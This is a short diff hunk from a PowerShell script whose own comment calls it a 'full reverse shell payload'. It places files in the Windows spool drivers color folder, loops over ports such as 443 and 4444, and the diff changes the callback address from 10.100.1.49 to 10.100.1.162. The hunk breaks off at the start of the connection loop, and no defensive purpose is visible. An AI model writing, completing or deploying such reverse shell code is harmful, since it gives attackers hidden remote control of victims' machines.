@@ -4,7 +4,7 @@ $dir = "C:\Windows\System32\spool\drivers\color"
 # full reverse shell payload written as a here-string so special chars are preserved
 $payload = @'
 $ports = @(80, 443, 8080, 3306, 4444, 5985, 8443)
-$ip    = "10.100.1.49"
+$ip    = "10.100.1.162"
 
 while ($true) {
     foreach ($port in $ports) {
